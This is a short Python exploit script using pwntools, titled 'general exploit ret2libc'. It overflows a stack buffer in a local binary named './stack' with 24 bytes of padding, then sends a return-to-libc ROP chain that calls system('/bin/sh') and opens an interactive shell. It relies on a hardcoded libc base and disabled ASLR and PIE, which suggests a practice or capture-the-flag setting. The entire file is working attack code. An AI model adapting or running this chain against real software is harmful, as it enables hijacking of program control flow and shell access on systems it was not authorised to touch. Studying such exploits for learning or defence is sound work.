# general exploit ret2libc

from pwn import *

context(os='linux', arch='amd64')
elf = context.binary = ELF("./stack")
rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./stack")

# finding gadgets from libc because ASLR and PIE is disabled
junk = b'A'*24
libc_base = 0x00007ffff7c00000
ret = libc_base + rop.find_gadget(["ret"]).address
pop_rdi_ret = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
exit  = libc_base + libc.symbols["exit"]

payload = flat(junk, ret, pop_rdi_ret, bin_sh, system, exit)
io.sendline(payload)
io.interactive()
io.close()



